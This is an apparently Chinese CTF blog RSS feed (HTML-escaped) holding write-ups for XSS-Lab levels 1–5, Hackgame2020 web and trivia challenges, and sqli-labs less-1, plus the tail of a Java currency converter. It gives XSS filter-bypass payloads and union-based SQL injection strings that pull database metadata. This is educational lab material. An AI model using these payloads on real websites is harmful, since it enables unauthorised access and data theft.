&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;元&amp;#39;&lt;/span>: res&lt;span style="color:#f92672">+=&lt;/span>temp;temp&lt;span style="color:#f92672">=&lt;/span>0;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;角&amp;#39;&lt;/span>: res&lt;span style="color:#f92672">+=&lt;/span>temp&lt;span style="color:#f92672">*&lt;/span>0.&lt;span style="color:#a6e22e">1&lt;/span>;temp&lt;span style="color:#f92672">=&lt;/span>0;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;分&amp;#39;&lt;/span>: res&lt;span style="color:#f92672">+=&lt;/span>temp&lt;span style="color:#f92672">*&lt;/span>0.&lt;span style="color:#a6e22e">01&lt;/span>;temp&lt;span style="color:#f92672">=&lt;/span>0;&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;整&amp;#39;&lt;/span>: &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">default&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;这个认不出来&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> s.&lt;span style="color:#a6e22e">charAt&lt;/span>(i));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> res;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	程序用的控制台输入，直接表格两列从头拉倒尾粘贴，出答案。程序的思路就是把金额大写当做字符串处理，每一位用&lt;code>switch&lt;/code>判断数字或是个、十、百、千那一位上的数字。&lt;/p></description></item><item><title>XSS-Lab (一)</title><link>/posts/ctf/xss-lab1/</link><pubDate>Tue, 03 Nov 2020 10:13:39 +0000</pubDate><guid>/posts/ctf/xss-lab1/</guid><description>&lt;h2 id="头">头&lt;/h2>
&lt;p>靶机地址：https://buuoj.cn/challenges#XSS-Lab&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/03/BsmJ5n.png" alt="">&lt;/p>
&lt;h2 id="level-1">level 1&lt;/h2>
&lt;p>​	&lt;img src="https://s1.ax1x.com/2020/11/03/BsmfKO.png" alt="">&lt;/p>
&lt;p>​	观察发现&lt;code>欢迎用户test&lt;/code>与URL中的&lt;code>name=test&lt;/code>字段对应，尝试修改发现可行。直接将&lt;code>name&lt;/code>字段改为&lt;code>name=&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;&lt;/code>，完工。&lt;/p>
&lt;h2 id="level-2">level 2&lt;/h2>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/03/BsnwWt.png" alt="">&lt;/p>
&lt;p>​	在搜索栏中的输入会回显到页面，查看网页源代码，发现值在&lt;code>input&lt;/code>的&lt;code>value&lt;/code>属性中&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/03/BsnLk9.png" alt="">&lt;/p>
&lt;p>​	构造闭合&lt;code>&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // &lt;/code>，构造以后的标签会变成&lt;code>.... value=&amp;quot;&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // &amp;quot;&amp;gt;&lt;/code>。完工&lt;/p>
&lt;h2 id="level-3">level 3&lt;/h2>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/03/BsKwKf.png" alt="">&lt;/p>
&lt;p>​	老样子构造&lt;code>value&lt;/code>属性闭合，尝试&lt;code>&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // &lt;/code>构造闭合，查看网页源代码发现语句变成&lt;code>&amp;amp;quot;&amp;amp;gt; &amp;amp;lt;script&amp;amp;gt;alert()&amp;amp;lt;/script&amp;amp;gt; // &lt;/code>，说明把&lt;code>&amp;quot;、&amp;lt;、&amp;gt;、&lt;/code>进行了html编码过滤，尝试构造&lt;code>onmouseover&lt;/code>事件(鼠标移到事件)，构造语句&lt;code>'onmouseover='alert()'&lt;/code>。完工&lt;/p>
&lt;h2 id="level-4">level 4&lt;/h2>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/03/BsMWYd.png" alt="">&lt;/p>
&lt;p>​	构造闭合&lt;code>&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // &lt;/code>，查看源代码发现进行了&lt;code>&amp;gt;、&amp;lt;&lt;/code>过滤，尝试构造事件&lt;code>&amp;quot; onmouseover='alert()'&lt;/code>。完工&lt;/p>
&lt;p>​	说明一下标签的事件有很多类型，可以自己试试别的事件响应。&lt;/p>
&lt;h2 id="level-5">level 5&lt;/h2>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/03/Bs1Ci4.png" alt="">&lt;/p>
&lt;p>​	检查一下都有什么过滤。发现有一下过滤&lt;/p>
&lt;blockquote>
&lt;p>script &amp;ndash;&amp;gt; scr_ipt&lt;/p>
&lt;p>onmouseover &amp;ndash;&amp;gt; o_nmouseover&lt;/p>
&lt;/blockquote>
&lt;p>无法采用事件，那么尝试构造一个标签&lt;code> &amp;quot;&amp;gt; &amp;lt;a href='javascript:alert()'&amp;gt;233&amp;lt;/a&amp;gt; //&lt;/code>，发现&lt;code>javascript&lt;/code>没有过滤，说明判断语句匹配值仅仅为&lt;code>script&lt;/code>，点击构造的&lt;code>&amp;lt;a&amp;gt;&lt;/code>标签内容。完工&lt;/p>
&lt;p>​&lt;/p></description></item><item><title>Hackgame2020(一)</title><link>/posts/ctf/hackgame20201/</link><pubDate>Sun, 01 Nov 2020 18:33:40 +0000</pubDate><guid>/posts/ctf/hackgame20201/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>比赛地址：https://hack.lug.ustc.edu.cn/&lt;/p>
&lt;h1 id="web">web&lt;/h1>
&lt;h3 id="签到题">签到题&lt;/h3>
&lt;p>​	第一题是flag提取器，打开题目以后页面是一个提取器下面一个&lt;code>进度条&lt;/code>和一个&lt;code>提取&lt;/code>按钮。&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwJbJs.png" alt="BwJbJs.png">&lt;/p>
&lt;p>​	随便拉了拉进度条发现初始是&lt;code>0&lt;/code>末尾是&lt;code>1.5&lt;/code>，然后中间的数值都是小数&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwYAQx.png" alt="BwYAQx.png">&lt;/p>
&lt;p>​	我猜的题目可能是想让数值为&lt;code>1&lt;/code>时能提取到flag。&lt;/p>
&lt;p>​	F12查看源代码，定位到进度条的标签，查看属性&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwYoX6.png" alt="">&lt;/p>
&lt;p>​	确实和猜测一样最大最小值分别是&lt;code>0&lt;/code>、&lt;code>1.5&lt;/code>，注意到&lt;code>step&lt;/code>值为&lt;code>0.00001&lt;/code>，就是这个属性让我们拖动进度条时，递增的值是小数，想精准得到&lt;code>1&lt;/code>个flag，就把网页上的&lt;code>step&lt;/code>值改为&lt;code>1&lt;/code>。然后随便拖动一下进度条得到&lt;code>1&lt;/code>，点击&lt;code>提取&lt;/code>按钮，完工。&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwNVaD.png" alt="">&lt;/p>
&lt;h3 id="2048">2048&lt;/h3>
&lt;p>​	打开题目是一个&lt;code>2048&lt;/code>的小游戏，第一个想法就是玩&lt;code>2048&lt;/code>达到一定分数以后会获得flag（&lt;del>可恶这个比赛怎么知道最近我天天在玩2048的&lt;/del>）,但是想比赛不可能让选手在线玩游戏吧，尤其对于我这种&lt;del>逃课废物&lt;/del>是不可能努力哒！&lt;/p>
&lt;p>F12开始翻网页资源&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwUONF.png" alt="">&lt;/p>
&lt;p>​	还好上次&lt;del>摸鱼&lt;/del>课题做了一个网页版的2048，略微能看懂一点点结构，第一个&lt;code>animframe_polyfill&lt;/code>应该就是管动画效果的，&lt;code>keynpard...&lt;/code>这个肯定是相应按键的，&lt;code>local_storage_manager&lt;/code>应该是保存游戏的，&lt;code>game_manager&lt;/code>感觉就是管理整个游戏的主要文件。&lt;/p>
&lt;p>​	打开&lt;code>game_manager&lt;/code>粗略的看了下变量，&lt;code>score&lt;/code> 分数、&lt;code>over、won、keepPlaying&lt;/code>游戏状态，想赢游戏肯定是和&lt;code>score、won&lt;/code>有关，直接Ctrl+F搜索整个文档这两个变量出现的位置。&lt;/p>
&lt;p>发现了&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwdGdK.png" alt="">&lt;/p>
&lt;p>​	只有这里修改了&lt;code>won&lt;/code>的状态，前面还有个&lt;code>16384&lt;/code>这个应该就是获得胜利需要得到的分数，这个分数对于我来说还是简简单单（&lt;del>小声bb&lt;/del>&lt;a href="https://s1.ax1x.com/2020/11/01/BwUdte.jpg">截图为证&lt;/a>），直接让&lt;code>if&lt;/code>里面的语句为真就可以获胜，直接修改&lt;code>if(1) self.won = true&lt;/code>，保存文件，按一个方向键让语句执行到，完工。&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwwpTK.png" alt="">&lt;/p>
&lt;h1 id="general">general&lt;/h1>
&lt;h3 id="猫咪问题">猫咪问题++&lt;/h3>
&lt;p>​	秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwLtDs.png" alt="">&lt;/p>
&lt;p>​	题意思很明显的书考验同学的搜题技巧。那就开工。&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/01/BwLD8U.png" alt="">&lt;/p>
&lt;h4 id="第一题">第一题&lt;/h4>
&lt;blockquote>
&lt;ol>
&lt;li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？&lt;/li>
&lt;/ol>
&lt;p>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.&lt;/p>
&lt;p>提示：学术上一般认为龙不属于哺乳动物。&lt;/p>
&lt;/blockquote>
&lt;p>​	本人只认识几个，那就一个一个搜呗。我的模式是：百度&lt;code>xxx标志&lt;/code>然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度&lt;code>xxx是哺乳动物吗&lt;/code>，妥妥的&lt;del>胎儿&lt;/del>教学。&lt;/p>
&lt;p>​	一个比较有印象就是&lt;code>FreeDOS&lt;/code>这个标志就离谱，什么玩意&lt;/p>
&lt;p>&lt;img src="https://src.onlinedown.net/supply/sup_logo/logo-1122/46778_g.jpg" alt="">&lt;/p>
&lt;p>&lt;strong>参考答案 ：12&lt;/strong>&lt;/p>
&lt;h4 id="第二题">第二题&lt;/h4>
&lt;blockquote>
&lt;ol start="2">
&lt;li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？&lt;/li>
&lt;/ol>
&lt;/blockquote>
&lt;p>​	卡了我好一会，没听过信鸽传输，贴上最后找到答案的&lt;a href="https://blog.csdn.net/qq_31621387/article/details/77690642">博客&lt;/a>，以及一篇信鸽传输的&lt;a href="http://sohu.com/a/309403082_354973">历史发展&lt;/a>，长见识了。&lt;/p></description></item><item><title>sql-labs(一)</title><link>/posts/ctf/sql-labs1/</link><pubDate>Tue, 22 Sep 2020 10:50:08 +0000</pubDate><guid>/posts/ctf/sql-labs1/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>在线靶机地址：https://buuoj.cn/challenges#sqli-labs&lt;/p>
&lt;h2 id="less-1">less-1&lt;/h2>
&lt;p>​	首先说明sql注入的大致步骤：&lt;/p>
&lt;ul>
&lt;li>判断注入类型。如整型字符型注入等。&lt;/li>
&lt;li>判断列数&lt;/li>
&lt;li>判断数据的回显位&lt;/li>
&lt;li>构造sql语句&lt;/li>
&lt;/ul>
&lt;p>​	根据题目提示，说明是一个单引号注入题目，构造一个带单引号的语句&lt;code>?id=1'&lt;/code>，发现数据库报错&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/04/BgERNd.png" alt="">&lt;/p>
&lt;p>​	通过后面的报错语句&lt;code>1'' LIMIT 0,1&lt;/code>的分析，我们的单引号被数据库解析，那么说明我们也可以使用连接查询&lt;code>union&lt;/code>插入我们想要查询的语句。&lt;/p>
&lt;p>​	推出数据库的查询的部分语句可能为&lt;code>where id = '$id'LIMIT 0,1&lt;/code>，那么通过构造闭合&lt;code>?id=1' [这里添加语句] --+&lt;/code>添加自己想要语句，语句后面的&lt;code>--+&lt;/code>作用是将后面的其他语句注释掉。&lt;/p>
&lt;p>​	首先是判断字段个数：&lt;code>?id=1' order by 1 --+&lt;/code>，页面显示正常，直到尝试&lt;code>?id=1' order by 4 --+&lt;/code>发现数据库报错&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/04/BgVsGn.png" alt="">&lt;/p>
&lt;p>​	说明数据库的字段值只有四个。&lt;/p>
&lt;p>​	接下来测试数据的回显位，构造语句&lt;code>?id=' union select 1,2,3 --+&lt;/code>，这里需要注意的有，前面&lt;code>id&lt;/code>的查询一定是要不存在的，因为数据库只会回显第一条查询的数据，如果第一条语句查询成功则后面&lt;code>union&lt;/code>构造的语句就不会显示；&lt;code>union&lt;/code>连接查询语句后面查询的字段数需要和前面的字段数相等，详细用法可以自行查询。&lt;/p>
&lt;p>​	执行后页面显示。&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/04/BgZAeS.png" alt="">&lt;/p>
&lt;p>​	说明查询语句的&lt;code>2,3&lt;/code>是回显位，之后就可以将查询的语句进行替换。如：&lt;/p>
&lt;p>​	获取数据库版本，数据库路径，当前用户，当前数据库：
​	&lt;code>?id=' union select 1,concat_ws('_',user(),version(),database()),@@basedir --+&lt;/code>&lt;/p>
&lt;p>页面显示&lt;/p>
&lt;p>&lt;img src="https://s1.ax1x.com/2020/11/04/BgZbfs.png" alt="">&lt;/p>
&lt;p>​	利用元数据库来爆表、爆数据&lt;/p>
&lt;p>​	&lt;code>?id=' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+&lt;/code>&lt;/p></description></item></channel></rss>